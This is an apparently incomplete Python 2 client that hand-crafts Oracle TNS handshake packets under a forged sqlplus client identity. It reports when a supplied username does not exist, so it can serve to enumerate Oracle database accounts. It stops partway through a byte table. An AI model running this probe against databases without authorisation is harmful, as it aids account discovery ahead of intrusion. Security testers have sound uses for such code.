#!/usr/bin/python

import socket
from struct import pack, unpack
import getopt
from sys import argv

def prepare(string):
	return pack('B',len(string))+'\x00\x00\x00'+pack('B',len(string))+bytes(string)

def connect(user, service, host, port, debug):
	s=socket.socket()
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	try:
		s.connect((host, int(port)))
	except:
		print "Connection error"
		return
	if debug: print ("Connecting to "+host+":"+str(port))

	header = dict([
		("Plength", ""),
		("PChecksum", "\x00\x00"),
		("PType", "\x01"),
		("Reserved", "\x00"),
		("HChecksum", "\x00\x00")])
	Pconnect = dict([
		("version", "\x01\x3a"),
		("compat", "\x01\x2c"),
		("options", "\x0c\x41"),
		("session", "\x20\x00"),
		("unitSize", "\x7f\xff"),
		("ntProto", "\x7f\x08"),
		("line", "\x00\x00"),
		("valueof1", "\x01\x00"),
		("lengthConnect", ""),
		("offsetConnect", "\x00\x3a"),
		("maxData", "\x00\x00\x02\x00"),
		("Flags0", "\x41"),
		("Flags1", "\x41"),
		("Trace0", "\x00\x00\x00\x00"),
		("Trace1", "\x00\x00\x00\x00"),
		("Traceunique", "\x00\x00\x00\x00\x00\x00\x00\x00"),
		("Pad", "\x00\x00\x00\x00\x00\x00\x00\x00"),
		("Data", "")])

	Pconnect["Data"]="(DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME="+service+")(CID=(PROGRAM=sqlplus@bzh)(HOST=bzh)(USER=r1)))"
	Pconnect["Data"]+="(ADDRESS=(PROTOCOL=TCP)(HOST="+host+")(PORT="+str(port)+")))"
	pl = len(Pconnect["Data"])
	Pconnect["lengthConnect"]=pack(">H", pl)
	header["Plength"]=pack(">H", (pl+58))
	
	Packet=header["Plength"]+header["PChecksum"]+header["PType"]+header["Reserved"]+header["HChecksum"]#+header["Pad"]
	Packet+= Pconnect["version"]+ Pconnect["compat"]+ Pconnect["options"]+ Pconnect["session"]+ Pconnect["unitSize"]
	Packet+=Pconnect["ntProto"]+ Pconnect["line"]+ Pconnect["valueof1"]+ Pconnect["lengthConnect"]+ Pconnect["offsetConnect"]
	Packet+= Pconnect["maxData"]+ Pconnect["Flags0"]+ Pconnect["Flags1"]+ Pconnect["Trace0"]+ Pconnect["Trace1"]
	Packet+=Pconnect["Traceunique"]+ Pconnect["Pad"]+Pconnect["Data"]
	PacketBytes = bytes(Packet) #, "ISO-8859-1")
	s.send(PacketBytes)

	while True:
		resp=s.recv(8192)
		try:
			if resp[4] == '\x0b':
				if debug: print "receive resend packet... resending..."
				s.send(PacketBytes)
			elif resp[4] == '\x05':
				if debug: print "receive redirect"
				print "Redirect not implementing yet... exiting"
				exit()
			elif resp[4] == '\x02':
				if debug: print "receive Accept"
				flag="\x00\x00"
				response=flag
				response+="\xde\xad\xbe\xef" #additional options
				response+="\x00\x92" # size deadbeef packet (from \xde to end)
				response+="\x0b\x10\x06\x00" # client version (11.1.0.6.0) supervisor
				response+="\x00\x04\x00\x00\x04\x00\x03\x00\x00\x00\x00\x00\x04\x00\x05"
				response+="\x0b\x10\x06\x00" #client version again...
				response+="\x00\x08\x00\x01\x00\x00"
				response+="\x47\x95\xab\x9f\x7a\x19" # Connection ID
				response+="\x00\x12\x00\x01\xde\xad\xbe\xef\x00\x03\x00\x00\x00\x04\x00\x04"
				response+="\x00\x01\x00\x01\x00\x02\x00\x01\x00\x03\x00\x00\x00\x00\x00\x04"
				response+="\x00\x05\x0b\x10\x06\x00\x00\x02\x00\x03"
				response+="\xe0\xe1" # connection type client/server
				response+="\x00\x02\x00\x06"
				response+="\xfc\xff" #status
				response+="\x00\x02\x00\x02\x00"
				response+="\x00\x00\x00\x00\x04\x00\x05\x0b\x10\x06\x00\x00\x0c\x00\x01\x00"
				response+="\x11\x06\x10\x0c\x0f\x0a\x0b\x08\x02\x01\x03\x00\x03\x00\x02\x00"
				response+="\x00\x00\x00\x00\x04\x00\x05\x0b\x10\x06\x00\x00\x03\x00\x01\x00"
				response+="\x03\x01"
				header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
				if debug: print "sending additional options"
				s.send(header+response) 
			elif resp[4] == '\x0c':
				if debug: print "Marker"
				if resp[8:11] == '\x01\x00\x02':
					print "User not exist"
					exit()
			elif resp[4] == '\x06':
				if debug: print "data"
				if resp[10:14] == '\xde\xad\xbe\xef':
					if debug: print "receive additional options"
					flag="\x00\x00"
					response=flag+"\x01" #protocol negociation
					response+="\x06\x05\x04\x03\x02\x01\x00" # accept protocol version 6,5,4,3,2,1
					#response+="\x78\x38\x36\x5f\x36\x34\x2f\x4c\x69\x6e\x75\x78\x20\x32\x2e\x34"  #x86_64/Linux 2.4 : arch client
					#response+="\x2e\x78\x78\x00"																	 #.xx : arch client (end of string)
					response+="\x4c\x69\x6e\x75\x78\x69\x33\x38\x36\x2f\x4c\x69\x6e\x75\x78\x2d"   #Linuxi386/Linux- : arch client
					response+="\x32\x2e\x30\x2e\x33\x34\x2d\x38\x2e\x31\x2e\x30\x00"					 #2.0.34-8.1.0   : arch client (end of string)
					header= pack('>H',8+len(response))+'\x00\x00'+'\x06'+'\x00\x00\x00'
					if debug: print "sending protocol negociation"
					s.send(header+response)
				if resp[10]=='\x01':
					if debug: print "receive protocol negotiation"
					#resp[11] chosen protocol
					remoteOS = resp[13:(13+resp[13:].index('\x00'))]
					if debug: print "Remote system : "+remoteOS
					flag="\x00\x00"
					response=flag+"\x02" # exchange data type representation
					
					if 'WIN_NT' in remoteOS:
						response+="\xb2\x00\xb2\x00\x42\x25\x06\x01\x01\x01\x0d\x01\x01\x05\x01\x01"
						response+="\x01\x01\x01\x01\x01\x7f\xff\x03\x09\x03\x03\x01\x00\x7f\x01\x1f"
						response+="\xff\x01\x03\x01\x01\x3f\x01\x01\x05\x00\x01\x07\x02\x01\x00\x00"
						response+="\x18\x00\x01\x80\x00\x00\x00\x3c\x3c\x3c\x80\x00\x00\x00\xd0\x07"
						response+="\x00\x01\x00\x01\x00\x01\x00\x00\x00\x02\x00\x02\x00\x0a\x00\x00"
						response+="\x00\x08\x00\x08\x00\x01\x00\x00\x00\x0c\x00\x0c\x00\x0a\x00\x00"
						response+="\x00\x17\x00\x17\x00\x01\x00\x00\x00\x18\x00\x18\x00\x01\x00\x00"
						response+="\x00\x19\x00\x19\x00\x18\x00\x19\x00\x01\x00\x00\x00\x1a\x00\x1a"
						response+="\x00\x19\x00\x1a\x00\x01\x00\x00\x00\x1b\x00\x1b\x00\x0a\x00\x1b"
						response+="\x00\x01\x00\x00\x00\x1c\x00\x1c\x00\x16\x00\x1c\x00\x01\x00\x00"
						response+="\x00\x1d\x00\x1d\x00\x17\x00\x1d\x00\x01\x00\x00\x00\x1e\x00\x1e"
						response+="\x00\x17\x00\x1e\x00\x01\x00\x00\x00\x1f\x00\x1f\x00\x19\x00\x1f"
						response+="\x00\x01\x00\x00\x00\x20\x00\x20\x00\x0a\x00\x20\x00\x01\x00\x00"
						response+="\x00\x21\x00\x21\x00\x0a\x00\x21\x00\x01\x00\x00\x00\x0a\x00\x0a"
						response+="\x00\x01\x00\x00\x00\x0b\x00\x0b\x00\x01\x00\x00\x00\x28\x00\x28"
						response+="\x00\x01\x00\x00\x00\x29\x00\x29\x00\x01\x00\x00\x00\x75\x00\x75"
						response+="\x00\x01\x00\x00\x00\x78\x00\x78\x00\x01\x00\x00\x01\x22\x01\x22"
						response+="\x00\x01\x00\x00\x01\x23\x01\x23\x00\x01\x01\x23\x00\x01\x00\x00"
						response+="\x01\x24\x01\x24\x00\x01\x00\x00\x01\x25\x01\x25\x00\x01\x00\x00"
						response+="\x01\x26\x01\x26\x00\x01\x00\x00\x01\x2a\x01\x2a\x00\x01\x00\x00"
						response+="\x01\x2b\x01\x2b\x00\x01\x00\x00\x01\x2c\x01\x2c\x00\x01\x00\x00"
						response+="\x01\x2d\x01\x2d\x00\x01\x00\x00\x01\x2e\x01\x2e\x00\x01\x00\x00"
						response+="\x01\x2f\x01\x2f\x00\x01\x00\x00\x01\x30\x01\x30\x00\x01\x00\x00"
						response+="\x01\x31\x01\x31\x00\x01\x00\x00\x01\x32\x01\x32\x00\x01\x00\x00"
						response+="\x01\x33\x01\x33\x00\x01\x00\x00\x01\x34\x01\x34\x00\x01\x00\x00"
						response+="\x01\x35\x01\x35\x00\x01\x00\x00\x01\x36\x01\x36\x00\x01\x00\x00"
						response+="\x01\x37\x01\x37\x00\x01\x00\x00\x01\x38\x01\x38\x00\x01\x00\x00"
						response+="\x01\x39\x01\x39\x00\x01\x00\x00\x01\x3b\x01\x3b\x00\x01\x00\x00"
						response+="\x01\x3c\x01\x3c\x00\x01\x00\x00\x01\x3d\x01\x3d\x00\x01\x00\x00"
						response+="\x01\x3e\x01\x3e\x00\x01\x00\x00\x01\x3f\x01\x3f\x00\x01\x00\x00"
						response+="\x01\x40\x01\x40\x00\x01\x00\x00\x01\x41\x01\x41\x00\x01\x00\x00"
						response+="\x01\x42\x01\x42\x00\x01\x00\x00\x01\x43\x01\x43\x00\x01\x00\x00"
						response+="\x01\x47\x01\x47\x00\x01\x00\x00\x01\x48\x01\x48\x00\x01\x00\x00"
						response+="\x01\x49\x01\x49\x00\x01\x00\x00\x01\x4b\x01\x4b\x00\x01\x00\x00"
						response+="\x01\x4d\x01\x4d\x00\x01\x00\x00\x01\x4e\x01\x4e\x00\x01\x00\x00"
						response+="\x01\x4f\x01\x4f\x00\x01\x00\x00\x01\x50\x01\x50\x00\x01\x00\x00"
						response+="\x01\x51\x01\x51\x00\x01\x00\x00\x01\x52\x01\x52\x00\x01\x00\x00"
						response+="\x01\x53\x01\x53\x00\x01\x00\x00\x01\x54\x01\x54\x00\x01\x00\x00"
						response+="\x01\x55\x01\x55\x00\x01\x00\x00\x01\x56\x01\x56\x00\x01\x00\x00"
						response+="\x01\x57\x01\x57\x00\x01\x01\x57\x00\x01\x00\x00\x01\x58\x01\x58"
						response+="\x00\x01\x00\x00\x01\x59\x01\x59\x00\x01\x00\x00\x01\x5a\x01\x5a"
						response+="\x00\x01\x00\x00\x01\x5c\x01\x5c\x00\x01\x00\x00\x01\x5d\x01\x5d"
						response+="\x00\x01\x00\x00\x01\x62\x01\x62\x00\x01\x00\x00\x01\x63\x01\x63"
						response+="\x00\x01\x00\x00\x01\x67\x01\x67\x00\x01\x00\x00\x01\x6b\x01\x6b"
						response+="\x00\x01\x00\x00\x01\x7c\x01\x7c\x00\x01\x01\x42\x00\x01\x00\x00"
						response+="\x01\x7d\x01\x7d\x00\x01\x00\x00\x01\x7e\x01\x7e\x00\x01\x00\x00"
						response+="\x01\x7f\x01\x7f\x00\x01\x00\x00\x01\x80\x01\x80\x00\x01\x00\x00"
						response+="\x01\x81\x01\x81\x00\x01\x00\x00\x01\x82\x01\x82\x00\x01\x00\x00"
						response+="\x01\x83\x01\x83\x00\x01\x00\x00\x01\x84\x01\x84\x00\x01\x00\x00"
						response+="\x01\x85\x01\x85\x00\x01\x00\x00\x01\x86\x01\x86\x00\x01\x00\x00"
						response+="\x01\x87\x01\x87\x00\x01\x00\x00\x01\x89\x01\x89\x00\x01\x00\x00"
						response+="\x01\x8a\x01\x8a\x00\x01\x00\x00\x01\x8b\x01\x8b\x00\x01\x00\x00"
						response+="\x01\x8c\x01\x8c\x00\x01\x00\x00\x01\x8d\x01\x8d\x00\x01\x00\x00"
						response+="\x01\x8e\x01\x8e\x00\x01\x00\x00\x01\x8f\x01\x8f\x00\x01\x00\x00"
						response+="\x01\x90\x01\x90\x00\x01\x00\x00\x01\x91\x01\x91\x00\x01\x00\x00"
						response+="\x01\x94\x01\x94\x00\x01\x01\x25\x00\x01\x00\x00\x01\x95\x01\x95"
						response+="\x00\x01\x00\x00\x01\x96\x01\x96\x00\x01\x00\x00\x01\x97\x01\x97"
						response+="\x00\x01\x00\x00\x01\x9d\x01\x9d\x00\x01\x00\x00\x01\x9e\x01\x9e"
						response+="\x00\x01\x00\x00\x01\x9f\x01\x9f\x00\x01\x00\x00\x01\xa0\x01\xa0"
						response+="\x00\x01\x00\x00\x01\xa1\x01\xa1\x00\x01\x00\x00\x01\xa2\x01\xa2"
						response+="\x00\x01\x00\x00\x01\xa3\x01\xa3\x00\x01\x00\x00\x01\xa4\x01\xa4"
						response+="\x00\x01\x00\x00\x01\xa5\x01\xa5\x00\x01\x00\x00\x01\xa6\x01\xa6"
						response+="\x00\x01\x00\x00\x01\xa7\x01\xa7\x00\x01\x00\x00\x01\xa8\x01\xa8"
						response+="\x00\x01\x00\x00\x01\xa9\x01\xa9\x00\x01\x00\x00\x01\xaa\x01\xaa"
						response+="\x00\x01\x00\x00\x01\xab\x01\xab\x00\x01\x00\x00\x01\xad\x01\xad"
						response+="\x00\x01\x00\x00\x01\xae\x01\xae\x00\x01\x00\x00\x01\xaf\x01\xaf"
						response+="\x00\x01\x00\x00\x01\xb0\x01\xb0\x00\x01\x00\x00\x01\xb1\x01\xb1"
						response+="\x00\x01\x00\x00\x01\xc1\x01\xc1\x00\x01\x00\x00\x01\xc2\x01\xc2"
						response+="\x00\x01\x01\x25\x00\x01\x00\x00\x01\xc6\x01\xc6\x00\x01\x00\x00"
						response+="\x01\xc7\x01\xc7\x00\x01\x00\x00\x01\xc8\x01\xc8\x00\x01\x00\x00"
						response+="\x01\xc9\x01\xc9\x00\x01\x00\x00\x01\xca\x01\xca\x00\x01\x01\x9f"
						response+="\x00\x01\x00\x00\x01\xcb\x01\xcb\x00\x01\x01\xa0\x00\x01\x00\x00"
						response+="\x01\xcc\x01\xcc\x00\x01\x01\xa2\x00\x01\x00\x00\x01\xcd\x01\xcd"
						response+="\x00\x01\x01\xa3\x00\x01\x00\x00\x01\xce\x01\xce\x00\x01\x01\xb1"
						response+="\x00\x01\x00\x00\x01\xcf\x01\xcf\x00\x01\x01\x22\x00\x01\x00\x00"
						response+="\x01\xd2\x01\xd2\x00\x01\x00\x00\x01\xd3\x01\xd3\x00\x01\x01\xab"
						response+="\x00\x01\x00\x00\x01\xd4\x01\xd4\x00\x01\x00\x00\x01\xd5\x01\xd5"
						response+="\x00\x01\x00\x00\x01\xd6\x01\xd6\x00\x01\x00\x00\x01\xd7\x01\xd7"
						response+="\x00\x01\x00\x00\x01\xd8\x01\xd8\x00\x01\x00\x00\x01\xd9\x01\xd9"
						response+="\x00\x01\x00\x00\x01\xda\x01\xda\x00\x01\x00\x00\x01\xdb\x01\xdb"
						response+="\x00\x01\x00\x00\x01\xdc\x01\xdc\x00\x01\x00\x00\x01\xdd\x01\xdd"
						response+="\x00\x01\x00\x00\x01\xde\x01\xde\x00\x01\x00\x00\x01\xdf\x01\xdf"
						response+="\x00\x01\x00\x00\x01\xe0\x01\xe0\x00\x01\x00\x00\x01\xe1\x01\xe1"
						response+="\x00\x01\x00\x00\x01\xe2\x01\xe2\x00\x01\x00\x00\x01\xe3\x01\xe3"
						response+="\x00\x01\x01\x6b\x00\x01\x00\x00\x01\xe4\x01\xe4\x00\x01\x00\x00"
						response+="\x01\xe5\x01\xe5\x00\x01\x00\x00\x01\xe6\x01\xe6\x00\x01\x00\x00"
						response+="\x01\xea\x01\xea\x00\x01\x00\x00\x01\xeb\x01\xeb\x00\x01\x00\x00"
						response+="\x01\xec\x01\xec\x00\x01\x00\x00\x01\xed\x01\xed\x00\x01\x00\x00"
						response+="\x01\xee\x01\xee\x00\x01\x00\x00\x01\xef\x01\xef\x00\x01\x00\x00"
						response+="\x01\xf0\x01\xf0\x00\x01\x00\x00\x01\xf2\x01\xf2\x00\x01\x00\x00"
						response+="\x01\xf3\x01\xf3\x00\x01\x00\x00\x01\xf4\x01\xf4\x00\x01\x00\x00"
						response+="\x01\xf5\x01\xf5\x00\x01\x00\x00\x01\xf6\x01\xf6\x00\x01\x00\x00"
						response+="\x01\xfd\x01\xfd\x00\x01\x00\x00\x01\xfe\x01\xfe\x00\x01\x00\x00"
						response+="\x02\x01\x02\x01\x00\x01\x00\x00\x02\x02\x02\x02\x00\x01\x00\x00"
						response+="\x02\x04\x02\x04\x00\x01\x00\x00\x02\x05\x02\x05\x00\x01\x00\x00"
						response+="\x02\x06\x02\x06\x00\x01\x00\x00\x02\x07\x02\x07\x00\x01\x00\x00"
						response+="\x02\x08\x02\x08\x00\x01\x00\x00\x02\x09\x02\x09\x00\x01\x00\x00"
						response+="\x02\x0a\x02\x0a\x00\x01\x00\x00\x02\x0b\x02\x0b\x00\x01\x00\x00"
						response+="\x02\x0c\x02\x0c\x00\x01\x00\x00\x02\x0d\x02\x0d\x00\x01\x00\x00"
						response+="\x02\x0e\x02\x0e\x00\x01\x00\x00\x02\x0f\x02\x0f\x00\x01\x00\x00"
						response+="\x02\x10\x02\x10\x00\x01\x00\x00\x02\x11\x02\x11\x00\x01\x00\x00"
						response+="\x02\x12\x02\x12\x00\x01\x00\x00\x02\x13\x02\x13\x00\x01\x00\x00"
						response+="\x02\x14\x02\x14\x00\x01\x00\x00\x02\x15\x02\x15\x00\x01\x00\x00"
						response+="\x02\x16\x02\x16\x00\x01\x00\x00\x02\x17\x02\x17\x00\x01\x00\x00"
						response+="\x02\x18\x02\x18\x00\x01\x00\x00\x02\x19\x02\x19\x00\x01\x00\x00"
						response+="\x02\x1a\x02\x1a\x00\x01\x00\x00\x02\x1b\x02\x1b\x00\x01\x00\x00"
						response+="\x02\x1c\x02\x1c\x00\x01\x00\x00\x02\x1d\x02\x1d\x00\x01\x00\x00"
						response+="\x02\x1e\x02\x1e\x00\x01\x00\x00\x02\x1f\x02\x1f\x00\x01\x00\x00"
						response+="\x02\x20\x02\x20\x00\x01\x00\x00\x02\x21\x02\x21\x00\x01\x00\x00"
						response+="\x02\x22\x02\x22\x00\x01\x00\x00\x02\x23\x02\x23\x00\x01\x00\x00"
						response+="\x02\x24\x02\x24\x00\x01\x00\x00\x02\x25\x02\x25\x00\x01\x00\x00"
						response+="\x02\x26\x02\x26\x00\x01\x00\x00\x02\x27\x02\x27\x00\x01\x00\x00"
						response+="\x02\x28\x02\x28\x00\x01\x00\x00\x02\x29\x02\x29\x00\x01\x00\x00"
						response+="\x02\x2a\x02\x2a\x00\x01\x00\x00\x02\x2b\x02\x2b\x00\x01\x00\x00"
						response+="\x02\x2c\x02\x2c\x00\x01\x00\x00\x02\x2d\x02\x2d\x00\x01\x00\x00"
						response+="\x02\x2e\x02\x2e\x00\x01\x00\x00\x02\x2f\x02\x2f\x00\x01\x00\x00"
						response+="\x02\x31\x02\x31\x00\x01\x00\x00\x02\x32\x02\x32\x00\x01\x00\x00"
						response+="\x02\x33\x02\x33\x00\x01\x00\x00\x02\x34\x02\x34\x00\x01\x00\x00"
						response+="\x02\x37\x02\x37\x00\x01\x00\x00\x02\x38\x02\x38\x00\x01\x00\x00"
						response+="\x02\x39\x02\x39\x00\x01\x00\x00\x02\x3a\x02\x3a\x00\x01\x00\x00"
						response+="\x02\x3b\x02\x3b\x00\x01\x00\x00\x02\x3c\x02\x3c\x00\x01\x00\x00"
						response+="\x02\x3d\x02\x3d\x00\x01\x00\x00\x02\x3e\x02\x3e\x00\x01\x00\x00"
						response+="\x02\x3f\x02\x3f\x00\x01\x00\x00\x02\x40\x02\x40\x00\x01\x00\x00"
						response+="\x02\x41\x02\x41\x00\x01\x00\x00\x02\x42\x02\x42\x00\x01\x00\x00"
						response+="\x02\x43\x02\x43\x00\x01\x00\x00\x02\x44\x02\x44\x00\x01\x00\x00"
						response+="\x02\x45\x02\x45\x00\x01\x00\x00\x02\x46\x02\x46\x00\x01\x00\x00"
						response+="\x02\x47\x02\x47\x00\x01\x00\x00\x02\x48\x02\x48\x00\x01\x00\x00"
						response+="\x02\x49\x02\x49\x00\x01\x00\x00\x00\x03\x00\x02\x00\x0a\x00\x00"
						response+="\x00\x04\x00\x02\x00\x0a\x00\x00\x00\x05\x00\x01\x00\x01\x00\x00"
						response+="\x00\x06\x00\x02\x00\x0a\x00\x00\x00\x07\x00\x02\x00\x0a\x00\x00"
						response+="\x00\x09\x00\x01\x00\x01\x00\x00\x00\x0d\x00\x00\x00\x0e\x00\x00"
						response+="\x00\x0f\x00\x17\x00\x01\x00\x00\x00\x10\x00\x00\x00\x11\x00\x00"
						response+="\x00\x12\x00\x00\x00\x13\x00\x00\x00\x14\x00\x00\x00\x15\x00\x00"
						response+="\x00\x16\x00\x00\x00\x27\x00\x78\x00\x01\x01\x5d\x00\x01\x01\x26"
						response+="\x00\x01\x00\x00\x00\x3a\x00\x3a\x00\x01\x00\x00\x00\x44\x00\x02"
						response+="\x00\x0a\x00\x00\x00\x45\x00\x00\x00\x46\x00\x00\x00\x4a\x00\x6d"
						response+="\x00\x01\x00\x00\x00\x4c\x00\x00\x00\x5b\x00\x02\x00\x0a\x00\x00"
						response+="\x00\x5e\x00\x01\x00\x01\x00\x00\x00\x5f\x00\x17\x00\x01\x00\x00"
						response+="\x00\x60\x00\x60\x00\x01\x00\x00\x00\x61\x00\x60\x00\x01\x00\x00"
						response+="\x00\x64\x00\x64\x00\x01\x00\x00\x00\x65\x00\x65\x00\x01\x00\x00"
						response+="\x00\x66\x00\x66\x00\x01\x00\x00\x00\x68\x00\x00\x00\x69\x00\x00"
						response+="\x00\x6a\x00\x6a\x00\x01\x00\x00\x00\x6c\x00\x6d\x00\x01\x00\x00"
						response+="\x00\x6d\x00\x6d\x00\x01\x00\x00\x00\x6e\x00\x6f\x00\x01\x00\x00"
						response+="\x00\x6f\x00\x6f\x00\x01\x00\x00\x00\x70\x00\x70\x00\x01\x00\x00"
						response+="\x00\x71\x00\x71\x00\x01\x00\x00\x00\x72\x00\x72\x00\x01\x00\x00"
						response+="\x00\x73\x00\x73\x00\x01\x00\x00\x00\x74\x00\x66\x00\x01\x00\x00"
						response+="\x00\x76\x00\x00\x00\x77\x00\x00\x00\x79\x00\x79\x00\x01\x00\x00"
						response+="\x00\x7a\x00\x7a\x00\x01\x00\x00\x00\x7b\x00\x7b\x00\x01\x00\x00"
						response+="\x00\x88\x00\x00\x00\x92\x00\x92\x00\x01\x00\x00\x00\x93\x00\x93"
						response+="\x00\x01\x00\x00\x00\x98\x00\x02\x00\x0a\x00\x00\x00\x99\x00\x02"
						response+="\x00\x0a\x00\x00\x00\x9a\x00\x02\x00\x0a\x00\x00\x00\x9b\x00\x01"
						response+="\x00\x01\x00\x00\x00\x9c\x00\x0c\x00\x0a\x00\x00\x00\xac\x00\x02"
						response+="\x00\x0a\x00\x00\x00\xb2\x00\xb2\x00\x01\x00\x00\x00\xb3\x00\xb3"
						response+="\x00\x01\x00\x00\x00\xb4\x00\xb4\x00\x01\x00\x00\x00\xb5\x00\xb5"
						response+="\x00\x01\x00\x00\x00\xb6\x00\xb6\x00\x01\x00\x00\x00\xb7\x00\xb7"
						response+="\x00\x01\x00\x00\x00\xb8\x00\x0c\x00\x0a\x00\x00\x00\xb9\x00\xb2"
						response+="\x00\x01\x00\x00\x00\xba\x00\xb3\x00\x01\x00\x00\x00\xbb\x00\xb4"
						response+="\x00\x01\x00\x00\x00\xbc\x00\xb5\x00\x01\x00\x00\x00\xbd\x00\xb6"
						response+="\x00\x01\x00\x00\x00\xbe\x00\xb7\x00\x01\x00\x00\x00\xbf\x00\x00"
						response+="\x00\xc0\x00\x00\x00\xc3\x00\x70\x00\x01\x00\x00\x00\xc4\x00\x71"
						response+="\x00\x01\x00\x00\x00\xc5\x00\x72\x00\x01\x00\x00\x00\xd0\x00\xd0"
						response+="\x00\x01\x00\x00\x00\xd1\x00\x00\x00\xe7\x00\xe7\x00\x01\x00\x00"
						response+="\x00\xe8\x00\xe7\x00\x01\x00\x00\x00\xe9\x00\xe9\x00\x01\x00\x00"
						response+="\x00\xf1\x00\x6d\x00\x01\x00\x00\x02\x03\x02\x03\x00\x01\x00\x00"
						response+="\x00\x00"
					else:
						#response+="\xb2\x00\xb2\x00\x42\x21\x06\x01\x01\x01\x0d\x01\x01\x04\x01\x01"
						#response+="\x01\x01\x01\x01\x01\xff\xff\x03\x08\x03\x03\x01\x00\x3f\x01\x07"
						#response+="\x3f\x01\x02\x01\x01\x03\x01\x05\x02\x01\x00\x00\x18\x80\x00\x00"
						#response+="\x00\x3c\x3c\x3c\x80\x00\x00\x00\xd0\x07"
						response+="\xb2\x00\xb2\x00\x42\x25\x06\x01\x01\x01\x0d\x01\x01\x05\x01"
						response+="\x01\x01\x01\x01\x01\x01\x7f\xff\x03\x09\x03\x03\x01\x00\x7f\x01"
						response+="\x1f\xff\x01\x03\x01\x01\x3f\x01\x01\x05\x00\x01\x07\x02\x01\x00"
						response+="\x00\x18\x00\x01\x80\x00\x00\x00\x3c\x3c\x3c\x80\x00\x00\x00\xd0"
						response+="\x07\x00\x01\x00\x01\x00\x01\x00\x00\x00\x02\x00\x02\x00\x0a\x00"
						response+="\x00\x00\x08\x00\x08\x00\x01\x00\x00\x00\x0c\x00\x0c\x00\x0a\x00"
						response+="\x00\x00\x17\x00\x17\x00\x01\x00\x00\x00\x18\x00\x18\x00\x01\x00"
						response+="\x00\x00\x19\x00\x19\x00\x18\x00\x19\x00\x01\x00\x00\x00\x1a\x00"
						response+="\x1a\x00\x19\x00\x1a\x00\x01\x00\x00\x00\x1b\x00\x1b\x00\x0a\x00"
						response+="\x1b\x00\x01\x00\x00\x00\x1c\x00\x1c\x00\x16\x00\x1c\x00\x01\x00"
						response+="\x00\x00\x1d\x00\x1d\x00\x17\x00\x1d\x00\x01\x00\x00\x00\x1e\x00"
						response+="\x1e\x00\x17\x00\x1e\x00\x01\x00\x00\x00\x1f\x00\x1f\x00\x19\x00"
						response+="\x1f\x00\x01\x00\x00\x00\x20\x00\x20\x00\x0a\x00\x20\x00\x01\x00"
						response+="\x00\x00\x21\x00\x21\x00\x0a\x00\x21\x00\x01\x00\x00\x00\x0a\x00"
						response+="\x0a\x00\x01\x00\x00\x00\x0b\x00\x0b\x00\x01\x00\x00\x00\x28\x00"
						response+="\x28\x00\x01\x00\x00\x00\x29\x00\x29\x00\x01\x00\x00\x00\x75\x00"
						response+="\x75\x00\x01\x00\x00\x00\x78\x00\x78\x00\x01\x00\x00\x01\x22\x01"
						response+="\x22\x00\x01\x00\x00\x01\x23\x01\x23\x00\x01\x01\x23\x00\x01\x00"
						response+="\x00\x01\x24\x01\x24\x00\x01\x00\x00\x01\x25\x01\x25\x00\x01\x00"
						response+="\x00\x01\x26\x01\x26\x00\x01\x00\x00\x01\x2a\x01\x2a\x00\x01\x00"
						response+="\x00\x01\x2b\x01\x2b\x00\x01\x00\x00\x01\x2c\x01\x2c\x00\x01\x00"
						response+="\x00\x01\x2d\x01\x2d\x00\x01\x00\x00\x01\x2e\x01\x2e\x00\x01\x00"
						response+="\x00\x01\x2f\x01\x2f\x00\x01\x00\x00\x01\x30\x01\x30\x00\x01\x00"
						response+="\x00\x01\x31\x01\x31\x00\x01\x00\x00\x01\x32\x01\x32\x00\x01\x00"
						response+="\x00\x01\x33\x01\x33\x00\x01\x00\x00\x01\x34\x01\x34\x00\x01\x00"
						response+="\x00\x01\x35\x01\x35\x00\x01\x00\x00\x01\x36\x01\x36\x00\x01\x00"
						response+="\x00\x01\x37\x01\x37\x00\x01\x00\x00\x01\x38\x01\x38\x00\x01\x00"
						response+="\x00\x01\x39\x01\x39\x00\x01\x00\x00\x01\x3b\x01\x3b\x00\x01\x00"
						response+="\x00\x01\x3c\x01\x3c\x00\x01\x00\x00\x01\x3d\x01\x3d\x00\x01\x00"
						response+="\x00\x01\x3e\x01\x3e\x00\x01\x00\x00\x01\x3f\x01\x3f\x00\x01\x00"
						response+="\x00\x01\x40\x01\x40\x00\x01\x00\x00\x01\x41\x01\x41\x00\x01\x00"
						response+="\x00\x01\x42\x01\x42\x00\x01\x00\x00\x01\x43\x01\x43\x00\x01\x00"
						response+="\x00\x01\x47\x01\x47\x00\x01\x00\x00\x01\x48\x01\x48\x00\x01\x00"
						response+="\x00\x01\x49\x01\x49\x00\x01\x00\x00\x01\x4b\x01\x4b\x00\x01\x00"
						response+="\x00\x01\x4d\x01\x4d\x00\x01\x00\x00\x01\x4e\x01\x4e\x00\x01\x00"
						response+="\x00\x01\x4f\x01\x4f\x00\x01\x00\x00\x01\x50\x01\x50\x00\x01\x00"
						response+="\x00\x01\x51\x01\x51\x00\x01\x00\x00\x01\x52\x01\x52\x00\x01\x00"
						response+="\x00\x01\x53\x01\x53\x00\x01\x00\x00\x01\x54\x01\x54\x00\x01\x00"
						response+="\x00\x01\x55\x01\x55\x00\x01\x00\x00\x01\x56\x01\x56\x00\x01\x00"
						response+="\x00\x01\x57\x01\x57\x00\x01\x01\x57\x00\x01\x00\x00\x01\x58\x01"
						response+="\x58\x00\x01\x00\x00\x01\x59\x01\x59\x00\x01\x00\x00\x01\x5a\x01"
						response+="\x5a\x00\x01\x00\x00\x01\x5c\x01\x5c\x00\x01\x00\x00\x01\x5d\x01"
						response+="\x5d\x00\x01\x00\x00\x01\x62\x01\x62\x00\x01\x00\x00\x01\x63\x01"
						response+="\x63\x00\x01\x00\x00\x01\x67\x01\x67\x00\x01\x00\x00\x01\x6b\x01"
						response+="\x6b\x00\x01\x00\x00\x01\x7c\x01\x7c\x00\x01\x01\x42\x00\x01\x00"
						response+="\x00\x01\x7d\x01\x7d\x00\x01\x00\x00\x01\x7e\x01\x7e\x00\x01\x00"
						response+="\x00\x01\x7f\x01\x7f\x00\x01\x00\x00\x01\x80\x01\x80\x00\x01\x00"
						response+="\x00\x01\x81\x01\x81\x00\x01\x00\x00\x01\x82\x01\x82\x00\x01\x00"
						response+="\x00\x01\x83\x01\x83\x00\x01\x00\x00\x01\x84\x01\x84\x00\x01\x00"
						response+="\x00\x01\x85\x01\x85\x00\x01\x00\x00\x01\x86\x01\x86\x00\x01\x00"
